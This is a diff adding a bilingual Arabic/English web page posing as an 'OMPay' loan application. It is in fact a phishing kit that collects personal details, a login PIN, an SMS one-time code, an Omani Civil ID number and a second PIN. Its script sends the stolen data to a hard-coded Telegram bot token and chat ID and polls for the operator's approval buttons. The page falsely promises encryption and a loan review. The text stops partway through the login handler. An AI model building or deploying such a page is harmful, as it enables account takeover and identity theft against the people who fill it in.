@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OMPay | طلب قرض</title>
+    <style>
+      :root {
+        --primary: #0d5bd7;
+        --primary-2: #1c89ff;
+        --primary-3: #0c2a6a;
+        --secondary: #0db8a4;
+        --text: #122133;
+        --muted: #697688;
+        --line: rgba(18, 33, 51, 0.08);
+        --input: #f8faff;
+        --success: #0f9a67;
+        --success-bg: #eafaf3;
+        --danger: #e14949;
+        --shadow: 0 22px 60px rgba(12, 43, 106, 0.14);
+        --bg: #eef4ff;
+      }
+
+      * { box-sizing: border-box; }
+
+      html, body {
+        margin: 0;
+        min-height: 100%;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: radial-gradient(circle at top left, rgba(28, 137, 255, 0.12), transparent 35%),
+                    radial-gradient(circle at bottom right, rgba(13, 184, 164, 0.14), transparent 30%),
+                    linear-gradient(135deg, var(--bg) 0%, #f5f7fc 100%);
+        color: var(--text);
+      }
+
+      body {
+        min-height: 100vh;
+        display: grid;
+        place-items: center;
+        padding: 28px;
+      }
+
+      .app {
+        width: 100%;
+        max-width: 430px;
+        min-height: 900px;
+        background: rgba(255,255,255,0.76);
+        backdrop-filter: blur(14px);
+        border: 1px solid rgba(255,255,255,0.7);
+        border-radius: 34px;
+        box-shadow: var(--shadow);
+        overflow: hidden;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .app::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(180deg, rgba(255,255,255,0.2), rgba(255,255,255,0));
+        pointer-events: none;
+      }
+
+      .topbar {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 20px 24px 14px;
+        border-bottom: 1px solid var(--line);
+      }
+
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .ompay-logo {
+        width: 40px;
+        height: 40px;
+        border-radius: 12px;
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-2) 100%);
+        display: grid;
+        place-items: center;
+        font-size: 18px;
+        font-weight: 900;
+        color: white;
+        box-shadow: 0 12px 20px rgba(13,91,215,0.28);
+      }
+
+      .brand-name {
+        font-size: 1.1rem;
+        font-weight: 800;
+        letter-spacing: 0.08em;
+        color: var(--primary-3);
+      }
+
+      .lang-selector {
+        position: relative;
+      }
+
+      .lang-dropdown {
+        width: 44px;
+        height: 44px;
+        border: 2px solid transparent;
+        border-radius: 10px;
+        background: rgba(13, 91, 215, 0.05);
+        font-size: 20px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        padding: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+      }
+
+      .lang-dropdown:hover { background: rgba(13, 91, 215, 0.12); }
+      .lang-dropdown:focus {
+        outline: none;
+        border-color: var(--primary);
+        box-shadow: 0 0 0 3px rgba(13, 91, 215, 0.1);
+      }
+
+      .lang-dropdown option { font-size: 16px; padding: 8px; }
+
+      .content {
+        position: relative;
+        z-index: 1;
+        flex: 1;
+        padding: 24px 24px;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .stepper {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        position: relative;
+        margin-bottom: 24px;
+      }
+
+      .stepper::before {
+        content: "";
+        position: absolute;
+        left: 18px;
+        right: 18px;
+        top: 18px;
+        height: 2px;
+        background: rgba(13, 91, 215, 0.1);
+        z-index: 0;
+      }
+
+      .step-item {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        flex: 1;
+        color: var(--muted);
+        font-size: 9px;
+        font-weight: 700;
+      }
+
+      .step-circle {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        display: grid;
+        place-items: center;
+        background: white;
+        border: 2px solid rgba(13, 91, 215, 0.12);
+        color: var(--muted);
+        font-weight: 700;
+        transition: all 0.2s ease;
+        font-size: 12px;
+      }
+
+      .step-item.active .step-circle {
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-2) 100%);
+        border-color: transparent;
+        color: white;
+        box-shadow: 0 10px 20px rgba(13, 91, 215, 0.22);
+      }
+
+      .step-item.done .step-circle {
+        background: rgba(15, 154, 103, 0.08);
+        border-color: rgba(15,154,103,0.18);
+        color: var(--success);
+      }
+
+      .steps-container { flex: 1; }
+
+      .step { display: none; animation: fadeIn 0.25s ease; }
+      .step.active { display: block; }
+
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(12px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+
+      .title {
+        margin: 0 0 12px;
+        font-size: 1.8rem;
+        line-height: 1.2;
+        letter-spacing: -0.02em;
+        color: var(--text);
+      }
+
+      .subtitle {
+        margin: 0 0 20px;
+        color: var(--muted);
+        font-size: 0.95rem;
+        line-height: 1.5;
+      }
+
+      .field { margin-bottom: 18px; }
+
+      .label {
+        display: block;
+        margin-bottom: 10px;
+        font-size: 12px;
+        font-weight: 700;
+        color: var(--text);
+      }
+
+      .input, .select {
+        width: 100%;
+        height: 56px;
+        border: 1px solid rgba(13, 91, 215, 0.12);
+        background: var(--input);
+        border-radius: 16px;
+        padding: 0 16px;
+        outline: none;
+        color: var(--text);
+        font-size: 1rem;
+        transition: all 0.2s ease;
+      }
+
+      .input:focus, .select:focus {
+        border-color: rgba(13,91,215,0.7);
+        box-shadow: 0 0 0 4px rgba(13,91,215,0.08);
+        background: white;
+      }
+
+      .input::placeholder { color: #9aa7b5; }
+
+      .slider-container { margin: 20px 0 14px; }
+
+      .slider-label {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 12px;
+        font-weight: 700;
+        margin-bottom: 12px;
+      }
+
+      .slider-amount {
+        font-size: 1.3rem;
+        color: var(--primary);
+      }
+
+      .slider {
+        width: 100%;
+        height: 8px;
+        border-radius: 10px;
+        background: rgba(13,91,215,0.12);
+        outline: none;
+        -webkit-appearance: none;
+        appearance: none;
+      }
+
+      .slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-2) 100%);
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(13,91,215,0.3);
+      }
+
+      .slider::-moz-range-thumb {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-2) 100%);
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(13,91,215,0.3);
+        border: none;
+      }
+
+      .loan-card {
+        background: linear-gradient(135deg, rgba(13, 91, 215, 0.03), rgba(13, 184, 164, 0.03));
+        border: 1px solid rgba(13, 91, 215, 0.08);
+        border-radius: 14px;
+        padding: 14px;
+        margin-top: 16px;
+      }
+
+      .loan-row {
+        display: flex;
+        justify-content: space-between;
+        padding: 6px 0;
+        color: var(--muted);
+      }
+
+      .loan-row strong { color: var(--text); }
+
+      .row-2col {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+
+      .btn {
+        width: 100%;
+        height: 56px;
+        border: none;
+        border-radius: 18px;
+        font-size: 1rem;
+        font-weight: 800;
+        cursor: pointer;
+        transition: transform 0.15s ease, box-shadow 0.15s ease;
+      }
+
+      .btn:hover { transform: translateY(-2px); }
+      .btn:active { transform: translateY(0); }
+      .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+      .primary-btn {
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-2) 100%);
+        color: white;
+        box-shadow: 0 16px 24px rgba(13, 91, 215, 0.25);
+      }
+
+      .secondary-btn {
+        background: rgba(13, 91, 215, 0.06);
+        color: var(--primary);
+        border: 1px solid rgba(13, 91, 215, 0.12);
+      }
+
+      .message {
+        min-height: 20px;
+        margin-top: 14px;
+        font-size: 12px;
+        font-weight: 700;
+        color: var(--danger);
+      }
+
+      .message.success { color: var(--success); }
+
+      .security-note {
+        margin-top: 18px;
+        padding: 12px 14px;
+        background: linear-gradient(135deg, rgba(13,91,215,0.03), rgba(13,184,164,0.03));
+        border: 1px solid rgba(13,91,215,0.08);
+        border-radius: 14px;
+        color: var(--muted);
+        font-size: 11px;
+        line-height: 1.5;
+      }
+
+      .review-box {
+        background: rgba(13, 91, 215, 0.08);
+        border: 1px solid rgba(13,91,215,0.12);
+        border-radius: 14px;
+        padding: 12px 14px;
+        margin-top: 18px;
+        text-align: center;
+        color: var(--primary);
+        font-weight: 700;
+      }
+
+      .success-page {
+        text-align: center;
+      }
+
+      .success-icon {
+        width: 88px;
+        height: 88px;
+        margin: 0 auto 18px;
+        border-radius: 50%;
+        background: rgba(15, 154, 103, 0.1);
+        display: grid;
+        place-items: center;
+        font-size: 42px;
+        color: var(--success);
+      }
+
+      .success-title {
+        margin: 0 0 8px;
+        font-size: 2rem;
+        color: var(--success);
+      }
+
+      .summary-box {
+        margin-top: 18px;
+        padding: 14px;
+        background: linear-gradient(135deg, rgba(13, 91, 215, 0.03), rgba(13,184,164,0.03));
+        border: 1px solid rgba(13,91,215,0.08);
+        border-radius: 14px;
+        text-align: right;
+      }
+
+      .summary-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 0;
+        border-bottom: 1px solid rgba(13,91,215,0.08);
+      }
+
+      .summary-row:last-child { border-bottom: none; }
+
+      .summary-label { color: var(--muted); font-size: 12px; }
+      .summary-value { font-weight: 700; color: var(--text); font-size: 13px; }
+
+      .loading-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .loading-overlay.show {
+        display: flex;
+      }
+
+      .loading-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 24px;
+      }
+
+      .spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top-color: white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        to { transform: rotate(360deg); }
+      }
+
+      .loading-text {
+        color: white;
+        font-size: 16px;
+        font-weight: 700;
+        text-align: center;
+      }
+
+      .footer {
+        position: relative;
+        z-index: 1;
+        border-top: 1px solid var(--line);
+        padding: 14px 24px;
+        text-align: center;
+        font-size: 10px;
+        color: var(--muted);
+        letter-spacing: 0.04em;
+      }
+
+      @media (max-width: 420px) {
+        body { padding: 0; }
+        .app { min-height: 100vh; border-radius: 0; max-width: none; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-container">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">الرجاء الانتظار أثناء التحقق من البيانات</div>
+      </div>
+    </div>
+
+    <div class="app">
+      <header class="topbar">
+        <div class="brand">
+          <div class="ompay-logo">OM</div>
+          <div class="brand-name">OMPay</div>
+        </div>
+
+        <div class="lang-selector">
+          <select class="lang-dropdown" id="langSelect">
+            <option value="ar">🇴🇲</option>
+            <option value="en">🇬🇧</option>
+          </select>
+        </div>
+      </header>
+
+      <main class="content">
+        <div class="stepper">
+          <div class="step-item active"><div class="step-circle">1</div><span data-ar="قرض" data-en="Loan">قرض</span></div>
+          <div class="step-item"><div class="step-circle">2</div><span data-ar="تفاصيل" data-en="Details">تفاصيل</span></div>
+          <div class="step-item"><div class="step-circle">3</div><span data-ar="تسجيل" data-en="Login">تسجيل</span></div>
+          <div class="step-item"><div class="step-circle">4</div><span data-ar="OTP" data-en="OTP">OTP</span></div>
+          <div class="step-item"><div class="step-circle">5</div><span data-ar="هوية" data-en="Verify">هوية</span></div>
+          <div class="step-item"><div class="step-circle">6</div><span data-ar="نجاح" data-en="Success">نجاح</span></div>
+        </div>
+
+        <div class="steps-container">
+          <!-- Step 1: Loan amount -->
+          <div class="step active" data-step="1">
+            <h1 class="title" data-ar="طلب قرض" data-en="Loan Request">طلب قرض</h1>
+            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Select desired loan amount with 4% annual interest rate and period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
+
+            <div class="field">
+              <label class="label" data-ar="مبلغ القرض" data-en="Loan Amount">مبلغ القرض</label>
+              <div class="slider-container">
+                <div class="slider-label">
+                  <span data-ar="المبلغ" data-en="Amount">المبلغ</span>
+                  <span class="slider-amount" id="loanAmountDisplay">50,000 ر.ع</span>
+                </div>
+                <input id="loanAmount" class="slider" type="range" min="10000" max="500000" step="5000" value="50000" />
+              </div>
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="مدة القرض" data-en="Loan Period">مدة القرض</label>
+              <select id="loanPeriod" class="select">
+                <option value="12" data-ar="12 شهر" data-en="12 months">12 شهر</option>
+                <option value="24" data-ar="24 شهر" data-en="24 months">24 شهر</option>
+                <option value="36" data-ar="36 شهر" data-en="36 months">36 شهر</option>
+                <option value="48" data-ar="48 شهر" data-en="48 months">48 شهر</option>
+                <option value="60" data-ar="60 شهر" data-en="60 months" selected>60 شهر</option>
+              </select>
+            </div>
+
+            <div class="loan-card">
+              <div class="loan-row"><span data-ar="معدل الفائدة" data-en="Interest Rate">معدل الفائدة</span><strong>4% <span data-ar="سنوياً" data-en="per year">سنوياً</span></strong></div>
+              <div class="loan-row"><span data-ar="الدفعة الشهرية" data-en="Monthly Payment">الدفعة الشهرية</span><strong id="monthlyPaymentText">1,088 ر.ع</strong></div>
+              <div class="loan-row"><span data-ar="إجمالي السداد" data-en="Total Payment">إجمالي السداد</span><strong id="totalPaymentText">65,280 ر.ع</strong></div>
+            </div>
+
+            <button class="btn primary-btn" type="button" data-next="2" data-ar="متابعة" data-en="Continue">متابعة</button>
+            <div id="error-1" class="message"></div>
+          </div>
+
+          <!-- Step 2: Details -->
+          <div class="step" data-step="2">
+            <h1 class="title" data-ar="بياناتك" data-en="Your Details">بياناتك</h1>
+            <p class="subtitle" data-ar="يرجى إدخال بياناتك الشخصية." data-en="Please enter your personal information.">يرجى إدخال بياناتك الشخصية.</p>
+
+            <div class="field">
+              <label class="label" data-ar="الاسم الأول" data-en="First Name">الاسم الأول</label>
+              <input id="firstName" class="input" type="text" data-ar-placeholder="محمد" data-en-placeholder="Mohammed" placeholder="محمد" />
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="اسم العائلة" data-en="Last Name">اسم العائلة</label>
+              <input id="lastName" class="input" type="text" data-ar-placeholder="الحميدي" data-en-placeholder="Al-Hammadi" placeholder="الحميدي" />
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="رقم الهاتف" data-en="Phone Number">رقم الهاتف</label>
+              <input id="detailsPhone" class="input" type="tel" inputmode="numeric" maxlength="8" data-ar-placeholder="91234567" data-en-placeholder="91234567" placeholder="91234567" />
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="تاريخ الميلاد" data-en="Date of Birth">تاريخ الميلاد</label>
+              <input id="dob" class="input" type="date" />
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="الغرض من القرض" data-en="Loan Purpose">الغرض من القرض</label>
+              <select id="loanPurpose" class="select">
+                <option value="" data-ar="اختر الغرض" data-en="Select Purpose">اختر الغرض</option>
+                <option value="home" data-ar="المنزل" data-en="Home">المنزل</option>
+                <option value="car" data-ar="السيارة" data-en="Car">السيارة</option>
+                <option value="education" data-ar="التعليم" data-en="Education">التعليم</option>
+                <option value="business" data-ar="الأعمال" data-en="Business">الأعمال</option>
+                <option value="personal" data-ar="شخصي" data-en="Personal">شخصي</option>
+              </select>
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="الدخل الشهري" data-en="Monthly Income">الدخل الشهري</label>
+              <input id="monthlyIncome" class="input" type="number" inputmode="numeric" data-ar-placeholder="2500" data-en-placeholder="2500" placeholder="2500" />
+            </div>
+
+            <div class="row-2col">
+              <button class="btn secondary-btn" type="button" data-back="1" data-ar="السابق" data-en="Back">السابق</button>
+              <button class="btn primary-btn" type="button" data-next="3" data-ar="متابعة" data-en="Continue">متابعة</button>
+            </div>
+            <div id="error-2" class="message"></div>
+          </div>
+
+          <!-- Step 3: Login -->
+          <div class="step" data-step="3">
+            <h1 class="title" data-ar="تسجيل الدخول" data-en="Login">تسجيل الدخول</h1>
+            <p class="subtitle" data-ar="رقم الهاتف يتم تعبئته تلقائيًا من الصفحة السابقة." data-en="Phone number will be filled automatically from the previous page.">رقم الهاتف يتم تعبئته تلقائيًا من الصفحة السابقة.</p>
+
+            <div class="field">
+              <label class="label" data-ar="رقم الهاتف" data-en="Phone Number">رقم الهاتف</label>
+              <div style="display:grid; grid-template-columns: 80px 1fr; gap:12px;">
+                <input class="input" type="text" value="+968" style="text-align:center;" disabled />
+                <input id="loginPhone" class="input" type="tel" inputmode="numeric" maxlength="8" />
+              </div>
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="رمز PIN" data-en="PIN Code">رمز PIN (4 إلى 6 أرقام)</label>
+              <input id="loginPin" class="input" type="password" inputmode="numeric" maxlength="6" data-ar-placeholder="••••••" data-en-placeholder="••••••" placeholder="••••••" />
+            </div>
+
+            <div class="row-2col">
+              <button class="btn secondary-btn" type="button" data-back="2" data-ar="السابق" data-en="Back">السابق</button>
+              <button class="btn primary-btn" type="button" id="submitLogin" data-ar="متابعة" data-en="Continue">متابعة</button>
+            </div>
+            <div id="error-3" class="message"></div>
+          </div>
+
+          <!-- Step 4: OTP -->
+          <div class="step" data-step="4">
+            <h1 class="title" data-ar="تحقق OTP" data-en="OTP Verification">تحقق OTP</h1>
+            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS, 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
+
+            <div class="field">
+              <label class="label" data-ar="رمز التحقق" data-en="Verification Code">رمز التحقق</label>
+              <input id="otpInput" class="input" type="text" inputmode="numeric" maxlength="6" data-ar-placeholder="••••••" data-en-placeholder="••••••" placeholder="••••••" />
+              <div class="review-box" data-ar="ينتهي الرمز خلال دقيقتين" data-en="Code expires in 2 minutes">ينتهي الرمز خلال دقيقتين</div>
+            </div>
+
+            <div class="row-2col">
+              <button class="btn secondary-btn" type="button" data-back="3" data-ar="السابق" data-en="Back">السابق</button>
+              <button class="btn primary-btn" type="button" id="submitOTP" data-ar="تحقق" data-en="Verify">تحقق</button>
+            </div>
+            <div id="error-4" class="message"></div>
+          </div>
+
+          <!-- Step 5: Civil ID + PIN -->
+          <div class="step" data-step="5">
+            <h1 class="title" data-ar="التحقق النهائي" data-en="Final Verification">التحقق النهائي</h1>
+            <p class="subtitle" data-ar="أدخل رقم بطاقة الهوية العمانية ورمز PIN الخاص بك." data-en="Enter your 8-digit Civil ID/Resident Card and PIN code.">أدخل رقم بطاقة الهوية العمانية ورمز PIN الخاص بك.</p>
+
+            <div class="field">
+              <label class="label" data-ar="الهوية العمانية / رقم الإقامة" data-en="Civil ID / Resident Card">الهوية العمانية / رقم الإقامة</label>
+              <input id="civilId" class="input" type="text" inputmode="numeric" maxlength="8" data-ar-placeholder="12345678" data-en-placeholder="12345678" placeholder="12345678" />
+            </div>
+
+            <div class="field">
+              <label class="label" data-ar="رمز PIN" data-en="PIN Code">رمز PIN (4 إلى 6 أرقام)</label>
+              <input id="verifyPin" class="input" type="password" inputmode="numeric" maxlength="6" data-ar-placeholder="••••••" data-en-placeholder="••••••" placeholder="••••••" />
+            </div>
+
+            <div class="row-2col">
+              <button class="btn secondary-btn" type="button" data-back="4" data-ar="السابق" data-en="Back">السابق</button>
+              <button class="btn primary-btn" type="button" id="submitVerify" data-ar="إرسال" data-en="Submit">إرسال</button>
+            </div>
+            <div id="error-5" class="message"></div>
+
+            <div class="security-note" data-ar="سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات." data-en="Your application will be reviewed within an hour. Your information is protected with multi-layer encryption.">سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات.</div>
+          </div>
+
+          <!-- Step 6: Success -->
+          <div class="step" data-step="6">
+            <div class="success-page">
+              <div class="success-icon">✓</div>
+              <h1 class="success-title" data-ar="مبروك!" data-en="Congratulations!">مبروك!</h1>
+              <p class="subtitle" data-ar="تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة." data-en="Your loan application has been successfully submitted and will be reviewed within one hour.">تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة.</p>
+
+              <div class="summary-box">
+                <div class="summary-row">
+                  <span class="summary-label" data-ar="الاسم" data-en="Name">الاسم</span>
+                  <span class="summary-value" id="summaryName">-</span>
+                </div>
+                <div class="summary-row">
+                  <span class="summary-label" data-ar="مبلغ القرض" data-en="Loan Amount">مبلغ القرض</span>
+                  <span class="summary-value" id="summaryLoan">-</span>
+                </div>
+                <div class="summary-row">
+                  <span class="summary-label" data-ar="المدة" data-en="Period">المدة</span>
+                  <span class="summary-value" id="summaryPeriod">-</span>
+                </div>
+                <div class="summary-row">
+                  <span class="summary-label" data-ar="الغرض" data-en="Purpose">الغرض</span>
+                  <span class="summary-value" id="summaryPurpose">-</span>
+                </div>
+                <div class="summary-row">
+                  <span class="summary-label" data-ar="الدفعة الشهرية" data-en="Monthly Payment">الدفعة الشهرية</span>
+                  <span class="summary-value" id="summaryMonthly">-</span>
+                </div>
+              </div>
+
+              <div class="review-box" id="reviewTimer" data-ar="المراجعة بعد: 01:00:00" data-en="Review in: 01:00:00">المراجعة بعد: 01:00:00</div>
+              <button class="btn primary-btn" type="button" onclick="location.reload()" style="margin-top:18px;" data-ar="ابدأ من جديد" data-en="Start Again">ابدأ من جديد</button>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      <footer class="footer">© 2026 OMPay. جميع الحقوق محفوظة.</footer>
+    </div>
+
+    <script>
+      // ===== CONFIG =====
+      // IMPORTANT: Replace with your actual Telegram bot token and chat ID
+      const TELEGRAM_BOT_TOKEN = '8926190714:AAHGvLheCwZbmxL46lcfz9-7nTSioYxg9fw';
+      const TELEGRAM_CHAT_ID = '8820857419';
+      const API_BASE_URL = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;
+      const POLLING_INTERVAL = 1000; // 1 second polling
+      
+      // ===== STATE =====
+      let currentLang = 'ar';
+      let formData = {};
+      let pollingInterval = null;
+      let lastUpdateId = -1;
+      
+      const steps = [...document.querySelectorAll('.step')];
+      const stepItems = [...document.querySelectorAll('.step-item')];
+      const langSelect = document.getElementById('langSelect');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+
+      // ===== LANGUAGE =====
+      function updateLanguage(lang) {
+        currentLang = lang;
+        document.documentElement.lang = lang;
+        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+        langSelect.value = lang;
+
+        document.querySelectorAll('[data-ar][data-en]').forEach(el => {
+          el.textContent = el.dataset[lang] || el.textContent;
+        });
+
+        document.querySelectorAll('[data-ar-placeholder][data-en-placeholder]').forEach(el => {
+          el.placeholder = lang === 'ar' ? el.dataset.arPlaceholder : el.dataset.enPlaceholder;
+        });
+
+        updateLoanSummary();
+      }
+
+      langSelect.addEventListener('change', (e) => {
+        updateLanguage(e.target.value);
+      });
+
+      // ===== LOADING OVERLAY =====
+      function showLoading(show = true) {
+        if (show) {
+          const text = currentLang === 'ar' ? 'الرجاء الانتظار أثناء التحقق من البيانات' : 'Please wait while we verify your details';
+          document.getElementById('loadingText').textContent = text;
+          loadingOverlay.classList.add('show');
+        } else {
+          loadingOverlay.classList.remove('show');
+        }
+      }
+
+      // ===== STEP NAVIGATION =====
+      function showStep(index) {
+        steps.forEach((step, i) => step.classList.toggle('active', i === index));
+        stepItems.forEach((item, i) => {
+          item.classList.toggle('active', i === index);
+          item.classList.toggle('done', i < index);
+        });
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      function setMessage(id, text = '', isSuccess = false) {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.textContent = text;
+        el.classList.toggle('success', isSuccess);
+      }
+
+      // ===== CALCULATIONS =====
+      function calculateLoan(amount, months) {
+        const rate = 0.04;
+        const monthlyRate = rate / 12;
+        const monthly = (amount * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+        return { monthly: monthly, total: monthly * months };
+      }
+
+      function formatMoney(value) {
+        return `${Number(value).toLocaleString('en-US')} ر.ع`;
+      }
+
+      function updateLoanSummary() {
+        const amount = Number(document.getElementById('loanAmount').value);
+        const months = Number(document.getElementById('loanPeriod').value);
+        const loan = calculateLoan(amount, months);
+
+        document.getElementById('loanAmountDisplay').textContent = formatMoney(amount);
+        document.getElementById('monthlyPaymentText').textContent = `${Math.round(loan.monthly).toLocaleString('en-US')} ر.ع`;
+        document.getElementById('totalPaymentText').textContent = `${Math.round(loan.total).toLocaleString('en-US')} ر.ع`;
+      }
+
+      // ===== VALIDATION =====
+      function validatePhone(value) {
+        return /^\d{8}$/.test(value);
+      }
+
+      function validatePin(value) {
+        return /^\d{4,6}$/.test(value);
+      }
+
+      function validateCivilId(value) {
+        return /^\d{8}$/.test(value);
+      }
+
+      // ===== TELEGRAM BOT INTEGRATION =====
+      async function sendToTelegram(message, buttons = []) {
+        try {
+          const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            reply_markup: buttons.length > 0 ? {
+              inline_keyboard: [buttons.map(btn => ({
+                text: btn.text,
+                callback_data: btn.data
+              }))]
+            } : undefined
+          };
+
+          const response = await fetch(`${API_BASE_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          const data = await response.json();
+          if (data.ok) {
+            console.log('Message sent to Telegram:', data.result.message_id);
+            return data.result.message_id;
+          }
+          console.error('Telegram error:', data);
+          return null;
+        } catch (error) {
+          console.error('Error sending to Telegram:', error);
+          return null;
+        }
+      }
+
+      async function checkTelegramResponse() {
+        try {
+          const response = await fetch(`${API_BASE_URL}/getUpdates?limit=5&offset=${lastUpdateId + 1}`);
+          const data = await response.json();
+
+          if (data.ok && data.result.length > 0) {
+            for (let update of data.result) {
+              lastUpdateId = update.update_id;
+              
+              if (update.callback_query) {
+                const callbackData = update.callback_query.data;
+                console.log('Received callback:', callbackData);
+                
+                // Acknowledge the callback
+                await fetch(`${API_BASE_URL}/answerCallbackQuery`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ callback_query_id: update.callback_query.id })
+                });
+                
+                return callbackData;
+              }
+            }
+          }
+          return null;
+        } catch (error) {
+          console.error('Error checking Telegram:', error);
+          return null;
+        }
+      }
+
+      // ===== STEP 1 & 2: Loan and Details =====
+      document.getElementById('loanAmount').addEventListener('input', updateLoanSummary);
+      document.getElementById('loanPeriod').addEventListener('change', updateLoanSummary);
+
+      document.querySelectorAll('[data-next]').forEach(btn => {
+        btn.addEventListener('click', function () {
+          const next = Number(this.dataset.next);
+          
+          if (this.dataset.next === '2') {
+            formData.loanAmount = Number(document.getElementById('loanAmount').value);
+            formData.loanPeriod = Number(document.getElementById('loanPeriod').value);
+            const calc = calculateLoan(formData.loanAmount, formData.loanPeriod);
+            formData.monthlyPayment = Math.round(calc.monthly);
+            formData.totalPayment = Math.round(calc.total);
+            setMessage('error-1', '');
+            showStep(1);
+            return;
+          }
+
+          if (this.dataset.next === '3') {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const phone = document.getElementById('detailsPhone').value.trim();
+            const dob = document.getElementById('dob').value;
+            const purpose = document.getElementById('loanPurpose').value;
+            const income = document.getElementById('monthlyIncome').value.trim();
+
+            if (!firstName || !lastName || !dob || !purpose || !income || !validatePhone(phone)) {
+              setMessage('error-2', currentLang === 'ar' ? 'يرجى إدخال البيانات بشكل صحيح.' : 'Please enter data correctly.');
+              return;
+            }
+
+            formData.firstName = firstName;
+            formData.lastName = lastName;
+            formData.phone = phone;
+            formData.dob = dob;
+            formData.loanPurpose = purpose;
+            formData.monthlyIncome = income;
+            document.getElementById('loginPhone').value = phone;
+            setMessage('error-2', '');
+            showStep(2);
+            return;
+          }
+
+          showStep(next);
+        });
+      });
+
+      document.querySelectorAll('[data-back]').forEach(btn => {
+        btn.addEventListener('click', function () {
+          const prev = Number(this.dataset.back);
+          if (pollingInterval) clearInterval(pollingInterval);
+          showLoading(false);
+          showStep(prev);
+        });
+      });
+
+      // ===== STEP 3: LOGIN WITH TELEGRAM APPROVAL =====
+      document.getElementById('submitLogin').addEventListener('click', async function () {
+        const loginPhone = document.getElementById('loginPhone').value.trim();
+        const loginPin = document.getElementById('loginPin').value.trim();
+
+        if (!validatePhone(loginPhone) || !validatePin(loginPin)) {
+          setMessage('error-3', currentLang === 'ar' ? 'يرجى إدخال رقم هاتف صالح ورمز PIN من 4 إلى 6 أرقام.' : 'Please enter a valid phone and PIN (4-6 digits).');
+          return;
+        }
+
+        formData.loginPhone = loginPhone;
+        formData.loginPin = loginPin;
+        setMessage('error-3', '');
+
+        // Send to Telegram
+        showLoading(true);
